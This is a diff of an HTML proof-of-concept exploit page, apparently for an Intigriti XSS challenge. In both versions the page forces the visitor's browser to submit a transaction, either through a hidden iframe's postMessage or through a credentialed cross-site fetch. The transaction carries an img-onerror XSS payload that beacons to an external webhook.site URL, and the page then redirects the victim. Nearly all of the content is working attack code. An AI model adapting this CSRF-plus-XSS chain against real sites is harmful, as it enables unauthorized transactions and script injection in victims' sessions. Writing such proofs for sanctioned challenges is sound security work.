@@ -2,48 +2,31 @@
 <html>
 <head><title>PoC</title></head>
 <body>
-<h1>XSS PoC</h1>
 <script>
-(function() {
-  const BASE = 'https://challenge-0126.intigriti.io';
-  const WEBHOOK = 'https://webhook.site/fd042032-f1e9-404c-b9b1-8fb39614db44';
+const BASE = 'https://challenge-0126.intigriti.io';
+const WEBHOOK = 'https://webhook.site/fd042032-f1e9-404c-b9b1-8fb39614db44';
 
-  // Simple image-based tracking (avoids CORS)
-  new Image().src = WEBHOOK + '/?step=1_start';
+// XSS payload
+const xss = `<img src=x onerror="alert('gigawatz');new Image().src='${WEBHOOK}/?xss=1'">`;
 
-  const xss = '<img src=x onerror="alert(\'gigawatz\');new Image().src=\'' + WEBHOOK + '/?xss=1\'">';
-
-  // Skip direct API calls - use postMessage only
-  const iframe = document.createElement('iframe');
-  iframe.src = BASE + '/checkout.html?currency=1337COIN&price=1';
-  iframe.style.display = 'none';
-  document.body.appendChild(iframe);
-
-  iframe.onload = function() {
-    new Image().src = WEBHOOK + '/?step=2_loaded';
-
-    setTimeout(function() {
-      // Send postMessage with XSS in nickname
-      iframe.contentWindow.postMessage({
-        type: 'submitTransaction',
-        transaction: {
-          nickname: xss,
-          toAddress: '10b5c9290725eeed3976d5dfe52fcbe23a',
-          currency: '1337COIN',
-          amount: 1
-        }
-      }, '*');
-
-      new Image().src = WEBHOOK + '/?step=3_sent';
-
-      // Redirect to marketwatch
-      setTimeout(function() {
-        new Image().src = WEBHOOK + '/?step=4_redirect';
-        window.location = BASE + '/marketwatch.html';
-      }, 4000);
-    }, 3000);
-  };
-})();
+// Direct API call - bypass checkout.html restrictions
+fetch(`${BASE}/api/transaction`, {
+  method: 'POST',
+  headers: {'Content-Type': 'application/json'},
+  credentials: 'include',
+  body: JSON.stringify({
+    toAddress: '10b5c9290725eeed3976d5dfe52fcbe23a',
+    currency: '1337COIN',
+    amount: 1,
+    nickname: xss
+  })
+}).then(r => r.json()).then(d => {
+  new Image().src = `${WEBHOOK}/?tx_status=ok`;
+  window.location = `${BASE}/marketwatch.html`;
+}).catch(e => {
+  new Image().src = `${WEBHOOK}/?tx_error=${encodeURIComponent(e.message)}`;
+  window.location = `${BASE}/marketwatch.html`;
+});
 </script>
 </body>
 </html>
